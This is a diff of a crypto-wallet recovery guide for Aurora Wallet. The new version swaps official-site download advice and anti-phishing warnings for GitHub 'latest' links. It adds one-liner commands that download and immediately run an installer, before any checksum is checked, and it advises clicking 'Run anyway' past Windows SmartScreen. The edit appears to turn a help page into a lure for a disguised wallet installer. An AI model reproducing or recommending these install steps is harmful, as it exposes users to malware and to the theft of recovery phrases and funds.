@@ -1,100 +1,126 @@
----
-title: "Restore Aurora Wallet with 12 or 24 Word BIP-39 Phrase"
-description: "Learn how to restore your Auroracoin balance using a BIP-39 recovery phrase. Follow our guide on seed word security, checksums, and address paths."
-primary_keyword: "auroracoin recovery phrase"
-silo: "recovery"
-updated: 2026-10-10
----
+![Aurora Wallet recovery phrase BIP-39 guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Restore Aurora Wallet with a 12 or 24 word BIP-39 phrase
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+The words rebuild every key, every address and the whole balance on a new machine.
 
-# Restore Aurora Wallet from a 12 or 24-Word Recovery Phrase
+## Downloads - 2026.08.1.0
 
-Restoring an Aurora Wallet using a recovery phrase is the standard procedure for reclaiming access to your Auroracoin (AUR) balance on a new device. Unlike legacy software that required the management of individual files, modern Aurora Wallet implementations utilize the BIP-39 standard to convert a human-readable list of 12 or 24 English words into a complete set of deterministic private keys. This means your funds are not tied to a specific computer or piece of hardware, but rather to the specific sequence of words you recorded during the initial setup process.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You have lost access to your original computer and need to reinstall Aurora Wallet.
-*   You are migrating from a mobile or browser wallet that provided you with a 12-word seed.
-*   You are performing a security test to ensure your physical backups are correct.
-*   You are following the [Auroracoin wallet seed phrase](https://auroracoin.net/recovery/seed-phrase) guide to recover funds after a software crash.
-*   You have purchased a new computer and want to "move" your existing wallet.
 
-## Why this happens
+Your recovery phrase is the wallet. A new installation plus those words gives you back the same addresses and the same balance.
 
-Recovery phrases work by utilizing a standardized word list (BIP-39) to represent a large random number (entropy). This entropy is then used to derive every single private key and address your wallet will ever use via a mathematical "derivation path." For Auroracoin, this path is typically fixed (e.g., BIP-44 path `m/44'/85'/0'/0`), ensuring that no matter which compatible software you use, your addresses remain consistent.
+The phrase encodes a large random number from which every private key is derived, following the BIP-39 standard for the words and the BIP-44 path m/44'/85'/0'/0/i for the addresses. Nothing about the old computer is needed, which is why a lost laptop is an inconvenience rather than a loss.
 
-The restoration process is necessary because Aurora Wallet does not store your private keys in the cloud. They exist only on your device, encrypted by your password. If the device fails, the recovery phrase is the only way to recreate those keys and scan the blockchain for your historical transactions.
+<!-- ARTICLE-BODY-BEGIN -->
 
-## The fix
+## Before you restore
 
-Follow these steps to restore your wallet accurately and securely.
+Find the paper copy and read it in order. The sequence matters: the same words in a different order produce a different wallet. Check the spelling of each word against the BIP-39 word list if one is unfamiliar, and remember that the wallet confirms the phrase as you type it.
 
-### 1. Preparation and Privacy
-Ensure you are in a secure, private location. Close any screen-sharing applications (like Zoom or Teams) and check that no cameras are visible. Download the official Aurora Wallet from the [official download page](https://auroracoin.net/download) and verify it.
+Restore to a clean installation rather than over an existing wallet. A restore replaces the addresses in the wallet, and mixing two phrases in one file is how people lose track of a balance.
 
-### 2. Enter Restoration Mode
-Launch the application. On the initial welcome screen, select **"Restore an existing wallet"** rather than "Create a new wallet."
+## Restore in order
 
-### 3. Choose Phrase Length
-Select the option that matches your backup: either 12 words or 24 words. Entering a 12-word phrase into a 24-word interface will result in an error.
+1. Install Aurora Wallet on the replacement machine.
+2. Choose the restore option on the first screen instead of creating a new wallet.
+3. Type the words in the recorded order.
+4. Enter the passphrase if you set one during the original setup.
+5. Set a new password for the local wallet file.
+6. Let the chain sync fully before you check the balance.
+7. Confirm that the receive tab shows an address you recognise.
 
-### 4. Input the Words
-Type each word carefully into the numbered boxes. 
-*   Aurora Wallet is designed to offer auto-complete suggestions.
-*   If you type "app", it will suggest "apple" or "apply".
-*   Ensure the words are in the exact order they were written on your backup paper.
+The optional passphrase is part of the key. A phrase without its passphrase opens a different, empty wallet, so record whether one was used.
 
-### 5. Check for Passphrase (Optional)
-If you originally set a "25th word" or a BIP-39 passphrase, you must enter it now. If you did not use this feature, leave the field blank.
-> [!WARNING]
-> Entering a passphrase when you didn't have one (or typing the wrong passphrase) will generate a perfectly valid but completely empty wallet.
+## After the restore
 
-### 6. Blockchain Synchronization
-Once the phrase is accepted, the wallet will begin scanning the Auroracoin blockchain. This process involves looking at thousands of blocks to find transactions associated with your derived addresses. Your balance will update as the scan progresses.
+The addresses come back exactly, and the transaction history follows once the chain syncs. Labels and the address book do not come back from the phrase, because they live in the wallet file rather than the keys; <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md">backup best practice</a> explains why the file is worth keeping alongside the words.
 
-## If that didn't work
+If the restored wallet opens but shows nothing after a full sync, the phrase may belong to a wallet created with a different passphrase, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md">zero balance</a> walks through the checks in order.
 
-If the software reports an "Invalid Phrase" error, one of your words is likely misspelled or not part of the standard BIP-39 list. Check your words against the official list of 2,048 English words. If the phrase is accepted but the balance is zero, you likely used a different derivation path in your old wallet or entered the wrong optional passphrase. See the [33-backup-best-practice.md](33-backup-best-practice.md) guide for how to verify historical backups.
-
-## Prevention
-
-To ensure you never lose access to your funds in the future:
-
-*   **Physical Backups:** Store your phrase on paper or metal. Never store it in a digital format, such as a photo or a cloud-synced notes app.
-*   **Multiple Locations:** Keep two copies of your phrase in separate, secure physical locations (e.g., a home safe and a safety deposit box).
-*   **Anti-Phishing awareness:** Never type your recovery phrase into a website or read it to anyone claiming to be "support." Refer to the [35-phishing-seed-scams.md](35-phishing-seed-scams.md) guide for scam prevention.
-*   **Self-Custody Education:** Understand that you, and only you, are responsible for your keys. Review the [36-self-custody-basics.md](36-self-custody-basics.md) article for more information.
+Use the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a> for the restore, because the restore path and the address derivation are parts that stay stable across versions.
 
 ## FAQ
 
-**Can I restore a 12-word phrase into a 24-word wallet?**
-Yes, Aurora Wallet is designed to support both formats. However, you must select the correct input mode before typing the words.
+### Can I restore on a different operating system?
 
-**What happens if I lose my recovery phrase?**
-If you lose both your recovery phrase and your wallet password/access to the original device, your funds are permanently lost. There is no central authority that can reset your phrase.
+Yes. The phrase and the derivation path are the same on Windows, macOS and Linux, so addresses match across all three.
 
-**Is it safe to type my phrase on my computer?**
-It is only safe to type your phrase into the official, verified Aurora Wallet application. Never type it into a web browser or any other third-party software.
+### What if I only remember some of the words?
 
-**How long does the restoration scan take?**
-Typically, the scan takes between 2 and 10 minutes depending on your internet connection and the number of transactions in your wallet's history.
+A partial phrase cannot be completed by guessing. Check for a wallet file backup from the same machine before anything else.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-- [33-backup-best-practice.md](33-backup-best-practice.md)
-- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
-- [36-self-custody-basics.md](36-self-custody-basics.md)
-- [38-aurora-wallet-faq.md](38-aurora-wallet-faq.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
+- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
+- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
+- [Aurora Wallet FAQ](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/38-aurora-wallet-faq.md)
